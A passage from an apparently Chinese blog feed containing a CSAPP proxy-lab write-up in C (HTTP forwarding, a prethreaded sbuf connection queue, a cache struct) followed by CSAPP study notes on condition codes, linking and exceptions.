class="built_in">strcmp</span>(<span class="string">"\r\n"</span>,buf))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">        <span class="built_in">Rio_writen</span>(client_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">        <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,<span class="number">2</span>*MAXLINE+<span class="number">5</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">Rio_writen</span>(client_fd,<span class="string">"\r\n"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\r\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(size = <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,MAXLINE))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">        <span class="built_in">Rio_writen</span>(client_fd,buf,size);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">StartWork</span><span class="params">(<span class="type">int</span> connfd)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE],uri[MAXLINE];</span><br><span class="line">    RequestLine requestline;</span><br><span class="line">    RequestHeader requestheaders[MAX_HEADERS];</span><br><span class="line">    <span class="type">rio_t</span> client_rio;</span><br><span class="line">    <span class="type">int</span> server_fd;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Rio_readinitb</span>(&amp;client_rio,connfd);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">Rio_readlineb</span>(&amp;client_rio,buf,MAXLINE))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="comment">//writeup中提到这里有个多行请求行的问题,待处理</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Ideally  your  HTTP  request  parser  will  be  fullyrobust according to the relevant sections of RFC 1945, except for one detail: while the specification allowsfor multiline request fields</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">sscanf</span>(buf,<span class="string">"%s %s %s"</span>,requestline.method,uri,requestline.version);</span><br><span class="line">    <span class="type">int</span> headers_num = <span class="built_in">read_requesthdrs</span>(&amp;client_rio,requestheaders);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">parse_uri</span>(uri,&amp;requestline);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"Host"</span>,requestline.host);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"User-Agent"</span>,user_agent_hdr);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"Connection"</span>,<span class="string">"close"</span>);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"Proxy-Connection"</span>,<span class="string">"close"</span>);</span><br><span class="line"></span><br><span class="line">    server_fd = <span class="built_in">open_clientfd</span>(requestline.host,requestline.port);</span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Connect to %s:%s.(serverFd: %d)\n"</span>,requestline.host,requestline.port,server_fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Write2Server</span>(server_fd,&amp;requestline,requestheaders,headers_num);</span><br><span class="line">    <span class="built_in">Forward2Client</span>(connfd,server_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> listenfd,connfd;</span><br><span class="line">    <span class="type">char</span> client_hostname[MAXLINE];</span><br><span class="line">    <span class="type">char</span> client_port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_storage</span> clientaddr;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr,PREFIX_PRINT<span class="string">"usage: %s &lt;port&gt;\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    listenfd = <span class="built_in">open_listenfd</span>(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="built_in">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = <span class="built_in">accept</span>(listenfd,(SA*)&amp;clientaddr,&amp;clientlen);</span><br><span class="line">        <span class="built_in">Getnameinfo</span>((SA*)&amp;clientaddr,clientlen,client_hostname,MAXLINE,client_port,MAX_PORTLEN,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Acceptd connection from (%s,%s),clientFd: %d\n"</span>,client_hostname,client_port,connfd);</span><br><span class="line">        <span class="built_in">StartWork</span>(connfd);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Part-B-2"><a href="#Part-B-2" class="headerlink" title="Part B"></a>Part B</h2><p>并发做的是预线程化的方式.照书上实现了sbuf包实现对client_fd(connfd)的管理.将之前程序中的StartWork作为线程例程.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306251624471.png"></p><h3 id="sbuf包"><a href="#sbuf包" class="headerlink" title="sbuf包"></a>sbuf包</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SBUF_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBUF_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> {</span><br><span class="line">    <span class="type">int</span>* buf;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="type">int</span> front;  <span class="comment">//buf[(front+1)%count]为第一个item</span></span><br><span class="line">    <span class="type">int</span> rear;   <span class="comment">//buf[rear%count]为最后一个元素</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;</span><br><span class="line">    <span class="type">sem_t</span> slots;</span><br><span class="line">    <span class="type">sem_t</span> items;</span><br><span class="line">}<span class="type">sbuf_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="type">sbuf_t</span>* sp,<span class="type">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="type">sbuf_t</span>* sp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="type">sbuf_t</span>* sp,<span class="type">int</span> item)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="type">sbuf_t</span>* sp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    sp-&gt;buf = <span class="built_in">calloc</span>(n,<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    sp-&gt;count = n;</span><br><span class="line">    sp-&gt;front = sp-&gt;rear = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sem_init</span>(&amp;sp-&gt;mutex,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sem_init</span>(&amp;sp-&gt;slots,<span class="number">0</span>,n);</span><br><span class="line">    <span class="built_in">sem_init</span>(&amp;sp-&gt;items,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">free</span>(sp-&gt;buf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;slots);</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    sp-&gt;buf[(++sp-&gt;rear)%(sp-&gt;count)] = item;</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;items);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;items);</span><br><span class="line">    <span class="built_in">sem_wait</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    item = sp-&gt;buf[(++sp-&gt;front)%(sp-&gt;count)];</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;mutex);</span><br><span class="line">    <span class="built_in">sem_post</span>(&amp;sp-&gt;slots);</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> listenfd,connfd;</span><br><span class="line">    <span class="type">char</span> client_hostname[MAXLINE];</span><br><span class="line">    <span class="type">char</span> client_port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_storage</span> clientaddr;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr,PREFIX_PRINT<span class="string">"usage: %s &lt;port&gt;\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sbuf_init</span>(&amp;sbuf,SBUFSIZE);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NTHREADS;++i)</span><br><span class="line">        <span class="built_in">pthread_create</span>(&amp;tid,<span class="literal">NULL</span>,StartWork,<span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    listenfd = <span class="built_in">open_listenfd</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="built_in">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = <span class="built_in">accept</span>(listenfd,(SA*)&amp;clientaddr,&amp;clientlen);        </span><br><span class="line">        <span class="built_in">Getnameinfo</span>((SA*)&amp;clientaddr,clientlen,client_hostname,MAXLINE,client_port,MAX_PORTLEN,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Acceptd connection from (%s,%s),clientFd: %d\n"</span>,client_hostname,client_port,connfd);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sbuf_insert</span>(&amp;sbuf,connfd);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Part-C-1"><a href="#Part-C-1" class="headerlink" title="Part C"></a>Part C</h2><p>类似于Cache lab的设计,读写cache使用的是读者优先的读者-写者模型.要注意的一点是读者读完后其实也会进行写(更新lru),所以也要上锁.<br>想清楚读者-写者模型的特征,每一个地方上锁是为了避免怎样的竞争,之后便可以根据需求做出变化.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> uri[MAXLINE];</span><br><span class="line">    <span class="type">char</span> content_type[MAXLINE];</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">    <span class="type">char</span> server[MAXLINE];</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> lru;</span><br><span class="line">}CacheLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">{</span><br><span class="line">    CacheLine* cachelines;</span><br><span class="line">    <span class="type">size_t</span> current_lru;</span><br><span class="line">    <span class="type">size_t</span> cache_num;</span><br><span class="line">    <span class="type">size_t</span> cache_size;</span><br><span class="line">}Cache;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306271005363.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP--Notes</title>
      <link href="/2023/CSAPP--Notes/"/>
      <url>/2023/CSAPP--Notes/</url>
      
        <content type="html"><![CDATA[<p>CSAPP阅读笔记<br>文章仅作为笔者复习参考,其中内容仅为笔者当前阶段学习CSAPP的理解.</p><h1 id="第三章-程序的机器级表示"><a href="#第三章-程序的机器级表示" class="headerlink" title="第三章 程序的机器级表示"></a>第三章 程序的机器级表示</h1><h3 id="3-6-1条件码"><a href="#3-6-1条件码" class="headerlink" title="3.6.1条件码:"></a>3.6.1条件码:</h3><p>CF:进位标志.最近的操作使最高位产生了进位.<br>ZF:零标志.最近操作的结果为0.<br>SF:符号标志.最近的操作得到负数.<br>OF:溢出标志.最近的操作导致一个补码溢出<br>PF:奇偶标志位.最近操作的结果所有bit中1为偶数<br>AF:辅助进位标志位 运算过程中看最后四位,不论长度为多少 最后四位向前有进位或者借位,AF=1,否则AF=0<br>TF:调试标志位 当TF=1时,处理器每次只执行一条指令,即单步执行<br>IF:中断允许标志位 它用来控制8086是否允许接收外部中断请求 若IF=1,8086能响应外部中断,反之则屏蔽外部中断<br>DF:方向标志位 在串处理指令中,每次操作后,如果DF=0,si di递增,如果DF=1,si di递减;注意此处DF的值是由程序员进行设定的 cld命令是将DF设置为0,std命令是将DF设置为1<br>进位标志表示无符号数运算结果是否超出范围，运算结果仍然正确；<br>溢出标志表示有符号数运算结果是否超出范围，运算结果已经不正确。<br>leaq指令不改变任何条件码.对于逻辑操作,进位标志和溢出标志会设置成0.对于移作,进位标志将设置为最后一个被移出的位,溢出标志设置为0.INC和DEC指令仅设出和零标志.</p><span id="more"></span><h1 id="第七章-链接"><a href="#第七章-链接" class="headerlink" title="第七章 链接"></a>第七章 链接</h1><h2 id="7-3目标文件"><a href="#7-3目标文件" class="headerlink" title="7.3目标文件"></a>7.3目标文件</h2><ol><li>可重定位目标文件:由编译器和汇编器产生,包含从地址0开始的代码和数据节</li><li>可执行目标文件:可直接复制到内存并执行</li><li>共享目标文件:特殊类型的可重定位目标文件,可以在加载或者运行时被动态地加载进内存并链接.</li></ol><h2 id="7-5-符号和符号表"><a href="#7-5-符号和符号表" class="headerlink" title="7.5 符号和符号表"></a>7.5 符号和符号表</h2><p>static属性的C函数和全局变量为局部符号,仅为定义该符号的模块(源文件)所私有,其他模块无法通过extern声明使用.用static来保护变量和函数是良好的编程习惯.</p><h3 id="符号表条目"><a href="#符号表条目" class="headerlink" title="符号表条目"></a>符号表条目</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>{</span></span><br><span class="line"><span class="type">int</span> name;</span><br><span class="line"><span class="type">char</span> type:<span class="number">4</span>,</span><br><span class="line">binding:<span class="number">4</span>;</span><br><span class="line"><span class="type">char</span> reserved;</span><br><span class="line"><span class="type">short</span> section;</span><br><span class="line"><span class="type">long</span> value;</span><br><span class="line"><span class="type">long</span> size;</span><br><span class="line">}Elf64_Symbol;</span><br></pre></td></tr></tbody></table></figure><p>name是字符串表(.strtab)中对应符号的字节偏移,type是数据或函数.binding指示符号是本地还是全局.value是距定义目标的节的起始位置的偏移(相对地址,<code>对于可执行目标文件来说,该值是一个绝对运行时地址</code>.<del>不是很理解呢?</del>)<br>每个符号被分配到目标文件的某个节,由section表示.<br>有三个特殊的伪节(仅存在于可重定位目标文件中):<br>    1.ABS 不该被重定位的符号<br>    2.UNDEF 未定义的符号<br>    3.COMMON 未初始化的全局变量<br>区别于COMMON节,bss分配未初始化的静态变量,以及初始化为0的全局或静态变量.</p><h2 id="7-6符号解析"><a href="#7-6符号解析" class="headerlink" title="7.6符号解析"></a>7.6符号解析</h2><p>将每个引用于它输入的可重定位目标文件的符号表中的一个确定符号定义关联</p><h3 id="7-6-1-多重定义的全局符号"><a href="#7-6-1-多重定义的全局符号" class="headerlink" title="7.6.1 多重定义的全局符号"></a>7.6.1 多重定义的全局符号</h3><p>函数和已初始化的全局变量是强符号,未初始化的全局变量是弱符号.<br>规则1:不允许多个同名的强符号<br>规则2:如果一个强符号和多个弱符号同名,选强符号<br>规则3:如果多个弱符号同名,则任意选择一个</p><p>该规则下会造成一些不易察觉的运行时错误.使用GCC-fno_common标志指示链接器不允许多重定义全局符号.</p><h3 id="7-6-2-与静态库链接"><a href="#7-6-2-与静态库链接" class="headerlink" title="7.6.2 与静态库链接"></a>7.6.2 与静态库链接</h3><h4 id="为什么要支持库的概念"><a href="#为什么要支持库的概念" class="headerlink" title="为什么要支持库的概念"></a>为什么要支持库的概念</h4><p>方案一:让编译器辨认出对标准函数的调用,并生成相应代码.<br>缺点:编译器过于复杂,每次增删改一个标准函数,就需要一个新版本编译器<br>方案二:将所有标准函数放在一个可重定位目标文件libc.o中<br>缺点:内存占用大,更新编译时间长<br>方案三:相关函数编译为独立的目标模块(静态库),链接时只复制被程序引用的目标模块.</p><h4 id="静态库实现"><a href="#静态库实现" class="headerlink" title="静态库实现"></a>静态库实现</h4><p>Linux以存档(archive)的特殊文件格式存储静态库.存档文件时一组连接起来的可重定位目标文件的集合,有一个头部用来描述每个成员目标文件的大小和位置(.a)</p><h3 id="7-6-3-链接器解析引用"><a href="#7-6-3-链接器解析引用" class="headerlink" title="7.6.3 链接器解析引用"></a>7.6.3 链接器解析引用</h3><p>在符号解析阶段,链接器从左到右按照静态库在命令行中出现的顺序扫描可重定位目标文件和存档文件(自动将.c翻译为.o).在这次扫描中,链接器维护一个可重定位文件的集合E(这个集合中的文件会被合并起来形成可执行文件),一个未解析的符号(引用了但未定义)集合U,一个在前面输入文件中已定义的符号集合D.初始时EUD均为空。<br>对于命令行中每一个输入文件f,若为目标文件,则把f添加到E,修改U和D反应f中的符号定义和引用.若为存档文件,遍历目录尝试寻找可重定位目标文件m匹配U中的未定义符号,将m添加到E中,修改U和D反应f中的符号定义和引用,直到U和D不再发生变化.此时不在E中的目标文件都被简单的丢弃.<br>若完成所有f的扫描后,U是非空的,则报错.否则就合并和重定位E中的目标文件,构建输出的可执行文件.<br>这样的算法决定了链接时文件需要排序.</p><h2 id="7-7-重定位"><a href="#7-7-重定位" class="headerlink" title="7.7 重定位"></a>7.7 重定位</h2><p>重定位将合并输入模块,为每个符号分配运行时地址.<br>重定位由两步组成:<br>    1.重定位节和符号定义.链接器将所有相同类型的节合并为同一类型的聚合节.然后将运行时的内存地址赋给新的聚合节,赋给输入模块定义的每个节,赋给输入模块定义的每个符号<br>    2.重定位节中的符号引用.依赖重定位条目,修改对每个符号的引用,使得它们指向正确的运行时地址.</p><h3 id="7-7-1-重定位条目"><a href="#7-7-1-重定位条目" class="headerlink" title="7.7.1 重定位条目"></a>7.7.1 重定位条目</h3><p>汇编器对最终位置未知的目标引用,生成一个重定位条目,指示链接器在合并时如何修改这个引用.代码的重定位条目放在.rel.text中,已初始化数据的重定位条目放在.rel.data中.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>{</span></span><br><span class="line"><span class="type">long</span> offset; <span class="comment">//符号引用距该节的字节偏移(节偏移)</span></span><br><span class="line"><span class="type">long</span> type:<span class="number">32</span>,<span class="comment">//指示如何修改引用</span></span><br><span class="line">symbol:<span class="number">32</span>;<span class="comment">//符号表中的index</span></span><br><span class="line"><span class="type">long</span> addend;<span class="comment">//有符号常数,指示对地址做偏移调整</span></span><br><span class="line">}Elf64_Rela</span><br></pre></td></tr></tbody></table></figure><p>链接器在每个节以及每个与该节相关联的重定位条目上迭代执行,根据不同重定位类型对修改引用为运行时地址相关数据.(绝对寻址、PC相对寻址…)</p><h2 id="7-10-动态链接库"><a href="#7-10-动态链接库" class="headerlink" title="7.10 动态链接库"></a>7.10 动态链接库</h2><h3 id="静态库的缺点"><a href="#静态库的缺点" class="headerlink" title="静态库的缺点"></a>静态库的缺点</h3><p>若静态库更新,必须显示的将程序与新的静态库重新链接.<br>且对一些大量使用的函数,这些函数的代码将会被复制到每个运行进程的文本段中,浪费内存.</p><h3 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h3><p>共享库(共享目标)是一个目标模块,在运行和加载时加载到相应内存地址,并和一个在内存中的程序链接起来.这一动态链接的过程由一个叫动态链接器的程序执行.在Linux中使用.so后缀,在微软操作系统中被称为DLL.<br>一个共享库的.text节的一个副本可以被不同的正在运行时的进程共享.</p><h2 id="7-11-从应用程序中加载和链接共享库"><a href="#7-11-从应用程序中加载和链接共享库" class="headerlink" title="7.11 从应用程序中加载和链接共享库"></a>7.11 从应用程序中加载和链接共享库</h2><p>dlopen,dlsym,dlerror.</p><h2 id="7-12-位置无关代码-fpic"><a href="#7-12-位置无关代码-fpic" class="headerlink" title="7.12 位置无关代码 -fpic"></a>7.12 位置无关代码 -fpic</h2><p>将共享库加载到内存的任意位置</p><h3 id="PIC数据引用"><a href="#PIC数据引用" class="headerlink" title="PIC数据引用"></a>PIC数据引用</h3><p>无论在任意地址加载一个目标模块,数据段与代码段距离保持不变.<br>编译器在数据段开始的地方创建GOT表,加载时动态链接器会重定位GOT表中的每个条目,使得它包含目标的绝对地址.<br>程序运行时,指令通过固定偏移访问对应GOT表并取出绝对地址,完成数据引用的解析.</p><h3 id="PIC函数调用"><a href="#PIC函数调用" class="headerlink" title="PIC函数调用"></a>PIC函数调用</h3><p>详见ret2dl_resolve.</p><h2 id="7-13-库打桩机制"><a href="#7-13-库打桩机制" class="headerlink" title="7.13 库打桩机制"></a>7.13 库打桩机制</h2><p>基本思想:给定一个需要打桩的目标函数,创建一个包装函数,它的院线和目标函数完全一样,使用某种特殊的打桩机制,欺骗系统调用目标函数,再将目标函数的返回值传递给调用者.</p><h3 id="7-13-1-编译时打桩"><a href="#7-13-1-编译时打桩" class="headerlink" title="7.13.1 编译时打桩"></a>7.13.1 编译时打桩</h3><p>更改可重定位目标文件路径.</p><h3 id="7-13-2-链接时打桩"><a href="#7-13-2-链接时打桩" class="headerlink" title="7.13.2 链接时打桩"></a>7.13.2 链接时打桩</h3><p>Linux静态链接器支持使用–wrap f标志打桩,将对f的引用解析成__wrap_f,把对__real_f的引用解析为f<br>gcc -Wl,–wrap,malloc</p><h3 id="7-13-3-运行时打桩"><a href="#7-13-3-运行时打桩" class="headerlink" title="7.13.3 运行时打桩"></a>7.13.3 运行时打桩</h3><p>修改动态链接器的LD_PRELOAD环境变量</p><h1 id="第八章-异常控制流"><a href="#第八章-异常控制流" class="headerlink" title="第八章 异常控制流"></a>第八章 异常控制流</h1><h2 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h2><p>处理器状态变化称为事件.<br>在任何情况下,当处理器检测到事件发生,它通过一张由异常表基址寄存器寻址的跳转表(即异常表),进行一个间接过程调用,到一个专门设计用来处理这类实践的操作系统子程序_——异常处理程序.</p><h3 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h3><p>系统中每种可能类型的异常都分配有一个非负整数的异常号,部分由处理器定义(被零除、缺页、内存访问违例、断点以及算术运算溢出),其他由操作系统内核定义(系统调用,外部IO信号)</p><p>当系统启动(计算机重启或加电)时,操作系统分配和初始化一张名为异常表的跳转表,当异常发生,处理器通过异常表基址n和异常号k,调用n+4*k地址存放的异常处理函数指针.</p><p>异常处理程序运行在内核模式下,对所有的系统资源有完全的访问权限.<br>当控制从用户程序转移到内核,所有的状态信息将压入内核栈中.</p><p>ps:linux系统调用使用的跳转表并非异常表,但也需要通过0x80号异常先进入异常处理程序再进一步跳转.</p><h3 id="8-1-2-异常的类别"><a href="#8-1-2-异常的类别" class="headerlink" title="8.1.2 异常的类别"></a>8.1.2 异常的类别</h3><ol><li>中断:处理器外部IO设备信号</li><li>陷阱和系统调用:执行一条指令产生的有意旳异常,在用户程序和内核之间提供一个接口,即系统调用.</li><li>故障:由错误情况引起,可能被故障处理程序修正,若成功修正就重新执行引起故障的指令,否则返回到abort例程终止程序.(如缺页,以及linux中的段错误,但linux并不会尝试恢复这个错误.)</li><li>终止:不可恢复的致命错误,返回到abort例程终止应用程序.</li></ol><h2 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 